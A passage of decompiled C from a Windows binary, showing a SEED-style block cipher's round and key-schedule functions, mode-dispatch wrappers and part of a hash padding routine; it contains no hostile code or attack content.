                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v38 + v37) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v38 + v37) >> 24) + 768];
  v40 = dword_140118300[(unsigned __int8)(v39 + v38)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v39 + v38) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v39 + v38) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v39 + v38) >> 24) + 768];
  v41 = v40 ^ v29;
  v42 = (v40 + v39) ^ v30;
  v43 = v42 ^ *(_DWORD *)(a3 + 48);
  v44 = dword_140118300[(unsigned __int8)(v41 ^ v43 ^ *(_BYTE *)(a3 + 52))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v41 ^ v43 ^ *(_WORD *)(a3 + 52)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v41 ^ (unsigned int)v43 ^ *(_DWORD *)(a3 + 52)) >> 16) + 512] ^ dword_140118300[((v41 ^ (unsigned int)v43 ^ *(_DWORD *)(a3 + 52)) >> 24) + 768];
  v45 = dword_140118300[(unsigned __int8)(v44 + v43)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v44 + v43) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v44 + v43) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v44 + v43) >> 24) + 768];
  v46 = dword_140118300[(unsigned __int8)(v45 + v44)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v45 + v44) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v45 + v44) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v45 + v44) >> 24) + 768];
  v47 = (v46 + v45) ^ v36;
  v48 = v46 ^ v35;
  v49 = v47 ^ *(_DWORD *)(a3 + 56);
  v50 = dword_140118300[(unsigned __int8)(v48 ^ v49 ^ *(_BYTE *)(a3 + 60))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v48 ^ v49 ^ *(_WORD *)(a3 + 60)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v48 ^ (unsigned int)v49 ^ *(_DWORD *)(a3 + 60)) >> 16) + 512] ^ dword_140118300[((v48 ^ (unsigned int)v49 ^ *(_DWORD *)(a3 + 60)) >> 24) + 768];
  v51 = dword_140118300[(unsigned __int8)(v50 + v49)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v50 + v49) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v50 + v49) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v50 + v49) >> 24) + 768];
  v52 = dword_140118300[(unsigned __int8)(v51 + v50)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v51 + v50) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v51 + v50) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v51 + v50) >> 24) + 768];
  v53 = v52 ^ v41;
  v54 = (v52 + v51) ^ v42;
  v55 = v54 ^ *(_DWORD *)(a3 + 64);
  v56 = dword_140118300[(unsigned __int8)(v53 ^ v55 ^ *(_BYTE *)(a3 + 68))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v53 ^ v55 ^ *(_WORD *)(a3 + 68)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v53 ^ (unsigned int)v55 ^ *(_DWORD *)(a3 + 68)) >> 16) + 512] ^ dword_140118300[((v53 ^ (unsigned int)v55 ^ *(_DWORD *)(a3 + 68)) >> 24) + 768];
  v57 = dword_140118300[(unsigned __int8)(v56 + v55)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v56 + v55) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v56 + v55) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v56 + v55) >> 24) + 768];
  v58 = dword_140118300[(unsigned __int8)(v57 + v56)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v57 + v56) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v57 + v56) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v57 + v56) >> 24) + 768];
  v59 = v58 ^ v48;
  v60 = (v58 + v57) ^ v47;
  v61 = v60 ^ *(_DWORD *)(a3 + 72);
  v62 = dword_140118300[(unsigned __int8)(v59 ^ v61 ^ *(_BYTE *)(a3 + 76))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v59 ^ v61 ^ *(_WORD *)(a3 + 76)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v59 ^ (unsigned int)v61 ^ *(_DWORD *)(a3 + 76)) >> 16) + 512] ^ dword_140118300[((v59 ^ (unsigned int)v61 ^ *(_DWORD *)(a3 + 76)) >> 24) + 768];
  v63 = dword_140118300[(unsigned __int8)(v62 + v61)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v62 + v61) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v62 + v61) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v62 + v61) >> 24) + 768];
  v64 = dword_140118300[(unsigned __int8)(v63 + v62)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v63 + v62) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v63 + v62) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v63 + v62) >> 24) + 768];
  v65 = v64 ^ v53;
  v66 = (v64 + v63) ^ v54;
  v67 = v66 ^ *(_DWORD *)(a3 + 80);
  v68 = dword_140118300[(unsigned __int8)(v65 ^ v67 ^ *(_BYTE *)(a3 + 84))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v65 ^ v67 ^ *(_WORD *)(a3 + 84)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v65 ^ (unsigned int)v67 ^ *(_DWORD *)(a3 + 84)) >> 16) + 512] ^ dword_140118300[((v65 ^ (unsigned int)v67 ^ *(_DWORD *)(a3 + 84)) >> 24) + 768];
  v69 = dword_140118300[(unsigned __int8)(v68 + v67)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v68 + v67) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v68 + v67) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v68 + v67) >> 24) + 768];
  v70 = dword_140118300[(unsigned __int8)(v69 + v68)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v69 + v68) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v69 + v68) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v69 + v68) >> 24) + 768];
  v71 = v70 ^ v59;
  v72 = (v70 + v69) ^ v60;
  v73 = v72 ^ *(_DWORD *)(a3 + 88);
  v74 = dword_140118300[(unsigned __int8)(v71 ^ v73 ^ *(_BYTE *)(a3 + 92))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v71 ^ v73 ^ *(_WORD *)(a3 + 92)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v71 ^ (unsigned int)v73 ^ *(_DWORD *)(a3 + 92)) >> 16) + 512] ^ dword_140118300[((v71 ^ (unsigned int)v73 ^ *(_DWORD *)(a3 + 92)) >> 24) + 768];
  v75 = dword_140118300[(unsigned __int8)(v74 + v73)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v74 + v73) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v74 + v73) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v74 + v73) >> 24) + 768];
  v76 = dword_140118300[(unsigned __int8)(v75 + v74)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v75 + v74) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v75 + v74) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v75 + v74) >> 24) + 768];
  v77 = v76 ^ v65;
  v78 = (v76 + v75) ^ v66;
  v79 = v78 ^ *(_DWORD *)(a3 + 96);
  v80 = dword_140118300[(unsigned __int8)(v77 ^ v79 ^ *(_BYTE *)(a3 + 100))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v77 ^ v79 ^ *(_WORD *)(a3 + 100)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v77 ^ (unsigned int)v79 ^ *(_DWORD *)(a3 + 100)) >> 16) + 512] ^ dword_140118300[((v77 ^ (unsigned int)v79 ^ *(_DWORD *)(a3 + 100)) >> 24) + 768];
  v81 = dword_140118300[(unsigned __int8)(v80 + v79)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v80 + v79) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v80 + v79) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v80 + v79) >> 24) + 768];
  v82 = dword_140118300[(unsigned __int8)(v81 + v80)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v81 + v80) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v81 + v80) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v81 + v80) >> 24) + 768];
  v83 = v82 ^ v71;
  v84 = (v82 + v81) ^ v72;
  v85 = v84 ^ *(_DWORD *)(a3 + 104);
  v86 = dword_140118300[(unsigned __int8)(v83 ^ v85 ^ *(_BYTE *)(a3 + 108))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v83 ^ v85 ^ *(_WORD *)(a3 + 108)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v83 ^ (unsigned int)v85 ^ *(_DWORD *)(a3 + 108)) >> 16) + 512] ^ dword_140118300[((v83 ^ (unsigned int)v85 ^ *(_DWORD *)(a3 + 108)) >> 24) + 768];
  v87 = dword_140118300[(unsigned __int8)(v86 + v85)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v86 + v85) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v86 + v85) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v86 + v85) >> 24) + 768];
  v88 = dword_140118300[(unsigned __int8)(v87 + v86)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v87 + v86) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v87 + v86) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v87 + v86) >> 24) + 768];
  v89 = v88 ^ v77;
  v90 = (v88 + v87) ^ v78;
  v91 = v90 ^ *(_DWORD *)(a3 + 112);
  v92 = dword_140118300[(unsigned __int8)(v89 ^ v91 ^ *(_BYTE *)(a3 + 116))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v89 ^ v91 ^ *(_WORD *)(a3 + 116)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v89 ^ (unsigned int)v91 ^ *(_DWORD *)(a3 + 116)) >> 16) + 512] ^ dword_140118300[((v89 ^ (unsigned int)v91 ^ *(_DWORD *)(a3 + 116)) >> 24) + 768];
  v93 = dword_140118300[(unsigned __int8)(v92 + v91)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v92 + v91) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v92 + v91) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v92 + v91) >> 24) + 768];
  v94 = dword_140118300[(unsigned __int8)(v93 + v92)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v93 + v92) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v93 + v92) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v93 + v92) >> 24) + 768];
  v95 = v94 ^ v83;
  v96 = (v94 + v93) ^ v84;
  v97 = v96 ^ *(_DWORD *)(a3 + 120);
  v98 = dword_140118300[(unsigned __int8)(v95 ^ v97 ^ *(_BYTE *)(a3 + 124))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v95 ^ v97 ^ *(_WORD *)(a3 + 124)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v95 ^ v97 ^ *(_DWORD *)(a3 + 124)) >> 16) + 512] ^ dword_140118300[((v95 ^ v97 ^ *(_DWORD *)(a3 + 124)) >> 24) + 768];
  v99 = dword_140118300[(unsigned __int8)(v98 + v97)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v98 + v97) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v98 + v97) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v98 + v97) >> 24) + 768];
  v100 = dword_140118300[(unsigned __int8)(v99 + v98)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v99 + v98) >> 8)
                                                                       + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v99 + v98) >> 16)
                                                                                              + 512] ^ dword_140118300[((unsigned int)(v99 + v98) >> 24) + 768];
  v101 = v100 ^ v89;
  v102 = (v100 + v99) ^ v90;
  a2[3] = v102;
  *a2 = HIBYTE(v102);
  a2[1] = BYTE2(v102);
  a2[2] = BYTE1(v102);
  a2[4] = HIBYTE(v101);
  a2[5] = BYTE2(v101);
  a2[6] = BYTE1(v101);
  a2[8] = HIBYTE(v96);
  a2[9] = BYTE2(v96);
  a2[10] = BYTE1(v96);
  a2[12] = HIBYTE(v95);
  a2[13] = BYTE2(v95);
  result = v95 >> 8;
  a2[7] = v101;
  a2[11] = v96;
  a2[15] = v95;
  a2[14] = BYTE1(v95);
  return result;
}
// 140118300: using guessed type _DWORD dword_140118300[1024];

//----- (0000000140097F60) ----------------------------------------------------
__int64 __fastcall sub_140097F60(unsigned __int8 *a1, int *a2)
{
  unsigned int v2; // edi
  unsigned int v3; // r11d
  unsigned int v4; // ebp
  unsigned int v5; // ebx
  unsigned int v6; // esi
  unsigned int v7; // edi
  int v8; // r10d
  unsigned int v9; // r11d
  unsigned int v10; // ebp
  unsigned int v11; // ebx
  unsigned int v12; // esi
  int v13; // r10d
  unsigned int v14; // edi
  unsigned int v15; // r11d
  unsigned int v16; // ebp
  unsigned int v17; // ebx
  unsigned int v18; // esi
  unsigned int v19; // edi
  unsigned int v20; // r11d
  unsigned int v21; // ebp
  unsigned int v22; // ebx
  unsigned int v23; // esi
  unsigned int v24; // r14d
  unsigned int v25; // r11d
  int v26; // r10d
  unsigned int v27; // ebp
  unsigned int v28; // ebx
  int v29; // r10d
  unsigned int v30; // esi
  unsigned int v31; // r14d
  int v32; // r10d
  unsigned int v33; // edi
  unsigned int v34; // ebp
  int v35; // r10d
  unsigned int v36; // ebx
  unsigned int v37; // esi
  int v38; // r10d
  int v39; // r11d
  int v40; // edi
  int v41; // r10d
  unsigned int v42; // r9d
  int v43; // ebx
  __int64 result; // rax

  v2 = a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8);
  v3 = a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8);
  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v5 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  *a2 = dword_140118300[(unsigned __int8)(v4 + v2 + 71)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)((a1[11] | (unsigned __int16)((a1[10] | (unsigned __int16)(_byteswap_ushort(*((_WORD *)a1 + 4)) << 8)) << 8)) + (a1[3] | (unsigned __int16)((a1[2] | (unsigned __int16)(_byteswap_ushort(*(_WORD *)a1) << 8)) << 8)) - 31161) >> 8)
                                                                         + 256] ^ dword_140118300[(unsigned __int8)((v4 + v2 + 1640531527) >> 16)
                                                                                                + 512] ^ dword_140118300[((v4 + v2 + 1640531527) >> 24) + 768];
  a2[1] = dword_140118300[(unsigned __int8)(v3 - v5 - 71)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v3 - v5 + 31161) >> 8)
                                                                           + 256] ^ dword_140118300[(unsigned __int8)((v3 - v5 - 1640531527) >> 16) + 512] ^ dword_140118300[((v3 - v5 - 1640531527) >> 24) + 768];
  v6 = (v2 >> 8) ^ (v3 << 24);
  v7 = (v3 >> 8) ^ (v2 << 24);
  v8 = v7 - v5 + 1013904243;
  a2[2] = dword_140118300[(unsigned __int8)(v4 + v6 - 115)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v4 + v6 + 3213) >> 8)
                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v4 + v6 - 1013904243) >> 16) + 512] ^ dword_140118300[((v4 + v6 - 1013904243) >> 24) + 768];
  v9 = (v4 << 8) ^ HIBYTE(v5);
  a2[3] = dword_140118300[(unsigned __int8)v8] ^ dword_140118300[BYTE1(v8) + 256] ^ dword_140118300[BYTE2(v8) + 512] ^ dword_140118300[HIBYTE(v8) + 768];
  v10 = (v5 << 8) ^ HIBYTE(v4);
  a2[4] = dword_140118300[(unsigned __int8)(v9 + v6 + 26)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v9 + v6 + 6426) >> 8)
                                                                           + 256] ^ dword_140118300[(unsigned __int8)((v9 + v6 - 2027808486) >> 16) + 512] ^ dword_140118300[((v9 + v6 - 2027808486) >> 24) + 768];
  a2[5] = dword_140118300[(unsigned __int8)(v7 - v10 - 26)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v7 - v10 - 6426) >> 8)
                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v7 - v10 + 2027808486) >> 16) + 512] ^ dword_140118300[((v7 - v10 + 2027808486) >> 24) + 768];
  v11 = (v6 >> 8) ^ (v7 << 24);
  v12 = (v7 >> 8) ^ (v6 << 24);
  v13 = v12 - v10 - 239350324;
  a2[6] = dword_140118300[(unsigned __int8)(v9 + v11 + 52)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v9 + v11 + 12852) >> 8)
                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v9 + v11 + 239350324) >> 16) + 512] ^ dword_140118300[((v9 + v11 + 239350324) >> 24) + 768];
  v14 = (v9 << 8) ^ HIBYTE(v10);
  a2[7] = dword_140118300[(unsigned __int8)v13] ^ dword_140118300[BYTE1(v13) + 256] ^ dword_140118300[BYTE2(v13) + 512] ^ dword_140118300[HIBYTE(v13) + 768];
  v15 = (v10 << 8) ^ HIBYTE(v9);
  a2[8] = dword_140118300[(unsigned __int8)(v14 + v11 + 103)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v14 + v11 + 25703) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v14 + v11 + 478700647) >> 16) + 512] ^ dword_140118300[((v14 + v11 + 478700647) >> 24) + 768];
  v16 = (v11 >> 8) ^ (v12 << 24);
  a2[9] = dword_140118300[(unsigned __int8)(v12 - v15 - 103)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v12 - v15 - 25703) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v12 - v15 - 478700647) >> 16) + 512] ^ dword_140118300[((v12 - v15 - 478700647) >> 24) + 768];
  v17 = (v12 >> 8) ^ (v11 << 24);
  a2[10] = dword_140118300[(unsigned __int8)(v14 + v16 - 51)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v14 + v16 - 14131) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v14 + v16 + 957401293) >> 16) + 512] ^ dword_140118300[((v14 + v16 + 957401293) >> 24) + 768];
  v18 = (v14 << 8) ^ HIBYTE(v15);
  a2[11] = dword_140118300[(unsigned __int8)(v17 - v15 + 51)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v17 - v15 + 14131) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v17 - v15 - 957401293) >> 16) + 512] ^ dword_140118300[((v17 - v15 - 957401293) >> 24) + 768];
  v19 = (v15 << 8) ^ HIBYTE(v14);
  a2[12] = dword_140118300[(unsigned __int8)(v18 + v16 - 103)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v18 + v16 - 28263) >> 8)
                                                                               + 256] ^ dword_140118300[(unsigned __int8)((v18 + v16 + 1914802585) >> 16) + 512] ^ dword_140118300[((v18 + v16 + 1914802585) >> 24) + 768];
  v20 = (v16 >> 8) ^ (v17 << 24);
  a2[13] = dword_140118300[(unsigned __int8)(v17 - v19 + 103)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v17 - v19 + 28263) >> 8)
                                                                               + 256] ^ dword_140118300[(unsigned __int8)((v17 - v19 - 1914802585) >> 16) + 512] ^ dword_140118300[((v17 - v19 - 1914802585) >> 24) + 768];
  v21 = (v17 >> 8) ^ (v16 << 24);
  a2[14] = dword_140118300[(unsigned __int8)(v18 + v20 + 49)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v18 + v20 + 9009) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v18 + v20 - 465362127) >> 16) + 512] ^ dword_140118300[((v18 + v20 - 465362127) >> 24) + 768];
  v22 = (v18 << 8) ^ HIBYTE(v19);
  a2[15] = dword_140118300[(unsigned __int8)(v21 - v19 - 49)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v21 - v19 - 9009) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v21 - v19 + 465362127) >> 16) + 512] ^ dword_140118300[((v21 - v19 + 465362127) >> 24) + 768];
  v23 = (v19 << 8) ^ HIBYTE(v18);
  a2[16] = dword_140118300[(unsigned __int8)(v22 + v20 + 98)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v22 + v20 + 18018) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v22 + v20 - 930724254) >> 16) + 512] ^ dword_140118300[((v22 + v20 - 930724254) >> 24) + 768];
  v24 = (v20 >> 8) ^ (v21 << 24);
  a2[17] = dword_140118300[(unsigned __int8)(v21 - v23 - 98)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v21 - v23 - 18018) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v21 - v23 + 930724254) >> 16) + 512] ^ dword_140118300[((v21 - v23 + 930724254) >> 24) + 768];
  v25 = (v21 >> 8) ^ (v20 << 24);
  v26 = v25 - v23 + 1861448508;
  a2[18] = dword_140118300[(unsigned __int8)(v22 + v24 - 60)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v22 + v24 - 29500) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v22 + v24 - 1861448508) >> 16) + 512] ^ dword_140118300[((v22 + v24 - 1861448508) >> 24) + 768];
  v27 = (v22 << 8) ^ HIBYTE(v23);
  a2[19] = dword_140118300[(unsigned __int8)v26] ^ dword_140118300[BYTE1(v26) + 256] ^ dword_140118300[BYTE2(v26) + 512] ^ dword_140118300[HIBYTE(v26) + 768];
  v28 = (v23 << 8) ^ HIBYTE(v22);
  v29 = v25 - v28 - 572070280;
  a2[20] = dword_140118300[(unsigned __int8)(v27 + v24 - 120)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v27 + v24 + 6536) >> 8)
                                                                               + 256] ^ dword_140118300[(unsigned __int8)((v27 + v24 + 572070280) >> 16) + 512] ^ dword_140118300[((v27 + v24 + 572070280) >> 24) + 768];
  v30 = (v24 >> 8) ^ (v25 << 24);
  a2[21] = dword_140118300[(unsigned __int8)v29] ^ dword_140118300[BYTE1(v29) + 256] ^ dword_140118300[BYTE2(v29) + 512] ^ dword_140118300[HIBYTE(v29) + 768];
  v31 = (v25 >> 8) ^ (v24 << 24);
  v32 = v31 - v28 - 1144140559;
  a2[22] = dword_140118300[(unsigned __int8)(v27 + v30 + 15)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v27 + v30 + 13071) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v27 + v30 + 1144140559) >> 16) + 512] ^ dword_140118300[((v27 + v30 + 1144140559) >> 24) + 768];
  v33 = (v27 << 8) ^ HIBYTE(v28);
  a2[23] = dword_140118300[(unsigned __int8)v32] ^ dword_140118300[BYTE1(v32) + 256] ^ dword_140118300[BYTE2(v32) + 512] ^ dword_140118300[HIBYTE(v32) + 768];
  v34 = (v28 << 8) ^ HIBYTE(v27);
  v35 = v31 - v34 + 2006686179;
  a2[24] = dword_140118300[(unsigned __int8)(v33 + v30 + 29)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v33 + v30 + 26141) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v33 + v30 - 2006686179) >> 16) + 512] ^ dword_140118300[((v33 + v30 - 2006686179) >> 24) + 768];
  v36 = (v30 >> 8) ^ (v31 << 24);
  a2[25] = dword_140118300[(unsigned __int8)v35] ^ dword_140118300[BYTE1(v35) + 256] ^ dword_140118300[BYTE2(v35) + 512] ^ dword_140118300[HIBYTE(v35) + 768];
  v37 = (v31 >> 8) ^ (v30 << 24);
  v38 = v37 - v34 - 281594938;
  a2[26] = dword_140118300[(unsigned __int8)(v33 + v36 + 58)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v33 + v36 - 13254) >> 8)
                                                                              + 256] ^ dword_140118300[(unsigned __int8)((v33 + v36 + 281594938) >> 16) + 512] ^ dword_140118300[((v33 + v36 + 281594938) >> 24) + 768];
  v39 = (v33 << 8) ^ HIBYTE(v34);
  a2[27] = dword_140118300[(unsigned __int8)v38] ^ dword_140118300[BYTE1(v38) + 256] ^ dword_140118300[BYTE2(v38) + 512] ^ dword_140118300[HIBYTE(v38) + 768];
  v40 = (v34 << 8) ^ HIBYTE(v33);
  v41 = v37 - v40 - 563189875;
  a2[28] = dword_140118300[(unsigned __int8)(v39 + v36 + 115)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v39 + v36 - 26509) >> 8)
                                                                               + 256] ^ dword_140118300[(unsigned __int8)((v39 + v36 + 563189875) >> 16) + 512] ^ dword_140118300[((v39 + v36 + 563189875) >> 24) + 768];
  a2[29] = dword_140118300[(unsigned __int8)v41] ^ dword_140118300[BYTE1(v41) + 256] ^ dword_140118300[BYTE2(v41) + 512] ^ dword_140118300[HIBYTE(v41) + 768];
  v42 = v39 + ((v36 >> 8) ^ (v37 << 24)) + 1126379749;
  v43 = ((v37 >> 8) ^ (v36 << 24)) - v40 - 1126379749;
  a2[30] = dword_140118300[(unsigned __int8)v42] ^ dword_140118300[BYTE1(v42) + 256] ^ dword_140118300[BYTE2(v42) + 512] ^ dword_140118300[HIBYTE(v42) + 768];
  result = (unsigned __int8)v43;
  a2[31] = dword_140118300[(unsigned __int8)v43] ^ dword_140118300[BYTE1(v43) + 256] ^ dword_140118300[BYTE2(v43) + 512] ^ dword_140118300[HIBYTE(v43) + 768];
  return result;
}
// 140118300: using guessed type _DWORD dword_140118300[1024];

//----- (0000000140098AC0) ----------------------------------------------------
__int64 __fastcall sub_140098AC0(unsigned __int8 *a1, _BYTE *a2, __int64 a3, int a4)
{
  if ( a4 )
    return sub_1400970C0(a1, a2, a3);
  else
    return sub_140096220(a1, a2, a3);
}

//----- (0000000140098AF0) ----------------------------------------------------
void __fastcall sub_140098AF0(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6)
{
  if ( (_DWORD)a6 )
    sub_140090B90(a1, a2, a3, a4, a5, (void (__fastcall *)(char *, char *, __int64))sub_1400970C0);
  else
    sub_1400908C0(
      (__int64 *)a1,
      (__int64 *)a2,
      a3,
      a4,
      a5,
      (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_140096220);
}

//----- (0000000140098B30) ----------------------------------------------------
char __fastcall sub_140098B30(
        _BYTE *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        unsigned int *a6,
        int a7)
{
  return sub_1400915F0(a1, a2, a3, a4, a5, a6, a7, (__int64 (__fastcall *)(__int64, __int64, __int64))sub_1400970C0);
}

//----- (0000000140098B80) ----------------------------------------------------
void __fastcall sub_140098B80(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, unsigned int *a6)
{
  sub_1400911D0(a1, a2, a3, a4, a5, a6, (void (__fastcall *)(__int64, __int64, __int64))sub_1400970C0);
}

//----- (0000000140098BC0) ----------------------------------------------------
__int64 __fastcall sub_140098BC0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned __int8 *v3; // rdi
  unsigned __int64 v6; // rbx
  int v7; // ecx
  __int64 result; // rax

  v2 = *(unsigned int *)(a2 + 88);
  v3 = (unsigned __int8 *)(a2 + 24);
  *(_BYTE *)(v2 + a2 + 24) = 0x80;
  v6 = v2 + 1;
  if ( v6 > 0x38 )
  {
    memset(&v3[v6], 0, 64 - v6);
    v6 = 0i64;
    sub_140098E60((int *)a2, v3, 1i64);
  }
  memset(&v3[v6], 0, 56 - v6);
  v3[56] = *(_BYTE *)(a2 + 16);
  v3[57] = *(_BYTE *)(a2 + 17);
  v3[58] = *(_BYTE *)(a2 + 18);
  v3[59] = *(_BYTE *)(a2 + 19);
  v3[60] = *(_BYTE *)(a2 + 20);
  v3[61] = *(_BYTE *)(a2 + 21);
  v3[62] = *(_BYTE *)(a2 + 22);
  v3[63] = *(_BYTE *)(a2 + 23);
  sub_140098E60((int *)a2, v3, 1i64);
  *(_DWORD *)(a2 + 88) = 0;
  sub_140023440((__int64)v3, 64i64);
  v7 = *(_DWORD *)a2;
